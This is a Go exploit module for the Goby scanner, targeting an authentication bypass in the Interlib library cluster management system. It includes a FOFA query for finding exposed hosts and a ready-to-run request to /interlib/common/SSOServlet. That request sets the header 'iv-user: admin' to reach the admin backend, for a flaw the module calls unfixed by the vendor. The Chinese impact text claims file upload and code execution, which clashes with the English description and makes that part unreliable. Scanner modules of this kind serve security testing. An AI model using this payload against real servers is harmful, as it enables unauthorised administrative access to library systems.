package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "InterliB-Library-Cluster-MS /Interlib/common/SSOServlet Permission Bypass Vulnerability",
    "Description": "<p>Guangzhou Tuchuang Computer Software Development Co., Ltd. is a high-tech enterprise that integrates product research and development, application integration, and customer service. Its main goal is to provide high-quality application software system design, integration, and maintenance services for library industry users.</p><p>There is a logic bypass in the library cluster management system of Guangzhou Tuchuang Computer Software Development Co., Ltd., and attackers can log in to the backend through this vulnerability, causing adverse effects.</p>",
    "Product": "InterliB-Library-Cluster-MS",
    "Homepage": "https://interlib.com.cn/",
    "DisclosureDate": "2024-04-01",
    "PostTime": "2024-04-19",
    "Author": "lidingke@baimaohui.net",
    "FofaQuery": "title==\"系统登陆\" && body=\"广州图创计算机软件开发有限公司\"",
    "GobyQuery": "title==\"系统登陆\" && body=\"广州图创计算机软件开发有限公司\"",
    "Level": "1",
    "Impact": "<p>There is a logic bypass in the library cluster management system of Guangzhou Tuchuang Computer Software Development Co., Ltd., and attackers can log in to the backend through this vulnerability, causing adverse effects.</p>",
    "Recommendation": "<p>1. Officials have not yet fixed the vulnerability. Please contact the vendor to fix the vulnerability: <a href=\"https://interlib.com.cn/\">https://interlib.com.cn/</a></p><p>2. Setting up access policies and white-list access through security devices such as firewalls.</p><p>3. Keep the system off the public web if it is not necessary.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "OR",
        {
            "Request": {
                "method": "GET",
                "uri": "/interlib/common/SSOServlet",
                "follow_redirect": false,
                "header": {
                    "Cache-Control": "max-age=0",
                    "Upgrade-Insecure-Requests": "1",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.9",
                    "Cookie": "JSESSIONID=B76D6FD3A72E8AA03D24608BA1214F13",
                    "Connection": "close",
                    "iv-user": "admin"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "302",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "loginid",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "keymemo|lastheader|variable|/interlib/common/SSOServlet",
                "vulurl|lastheader|variable|{{{fixedhostinfo}}}/interlib/common/SSOServlet"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/interlib/common/SSOServlet?",
                "follow_redirect": false,
                "header": {
                    "Cache-Control": "max-age=0",
                    "Upgrade-Insecure-Requests": "1",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                    "Accept-Encoding": "gzip, deflate",
                    "Accept-Language": "zh-CN,zh;q=0.9",
                    "Cookie": "JSESSIONID=B76D6FD3A72E8AA03D24608BA1214F13",
                    "Connection": "close",
                    "iv-user": "admin"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "302",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "loginid",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastheader|variable|绕过成功，访问/interlib/common/SSOServlet，在header添加Iv-User: admin即可绕过"
            ]
        }
    ],
    "Tags": [
        "Permission Bypass",
        "HW-2023"
    ],
    "VulType": [
        "Permission Bypass"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "6.5",
    "Translation": {
        "CN": {
            "Name": "Interlib图书馆集群管理系统 /interlib/common/SSOServlet/ 权限绕过漏洞",
            "Product": "Interlib图书馆集群管理系统",
            "Description": "<p>广州图创计算机软件开发有限公司一是集产品研发、应用集成、客户服务为一体的高新技术企业，主要目标是为图书馆行业用户提供高质量的应用软件系统设计、集成和维护服务。</p><p>广州图创计算机软件开发有限公司图书馆集群管理系统存在逻辑绕过，攻击者可通过此漏洞登录后台，从而造成不良影响。<br></p>",
            "Recommendation": "<p>1、官⽅暂未修复该漏洞，请⽤户联系⼚商修复漏洞：<a href=\"https://interlib.com.cn/\">https://interlib.com.cn/</a><a href=\"https://www.adobe.com/\" target=\"_blank\"></a></p><p>2、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>3、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Impact": "<p>攻击者可通过该漏洞上传任意文件，任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器，导致⽹站处于极度不安全状态。<br></p>",
            "VulType": [
                "权限绕过"
            ],
            "Tags": [
                "权限绕过",
                "HW-2023"
            ]
        },
        "EN": {
            "Name": "InterliB-Library-Cluster-MS /Interlib/common/SSOServlet Permission Bypass Vulnerability",
            "Product": "InterliB-Library-Cluster-MS",
            "Description": "<p>Guangzhou Tuchuang Computer Software Development Co., Ltd. is a high-tech enterprise that integrates product research and development, application integration, and customer service. Its main goal is to provide high-quality application software system design, integration, and maintenance services for library industry users.</p><p>There is a logic bypass in the library cluster management system of Guangzhou Tuchuang Computer Software Development Co., Ltd., and attackers can log in to the backend through this vulnerability, causing adverse effects.</p>",
            "Recommendation": "<p>1. Officials have not yet fixed the vulnerability. Please contact the vendor to fix the vulnerability:&nbsp;<a href=\"https://interlib.com.cn/\">https://interlib.com.cn/</a></p><p>2. Setting up access policies and white-list access through security devices such as firewalls.</p><p>3. Keep the system off the public web if it is not necessary.</p>",
            "Impact": "<p>There is a logic bypass in the library cluster management system of Guangzhou Tuchuang Computer Software Development Co., Ltd., and attackers can log in to the backend through this vulnerability, causing adverse effects.<br></p>",
            "VulType": [
                "Permission Bypass"
            ],
            "Tags": [
                "Permission Bypass",
                "HW-2023"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10967"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
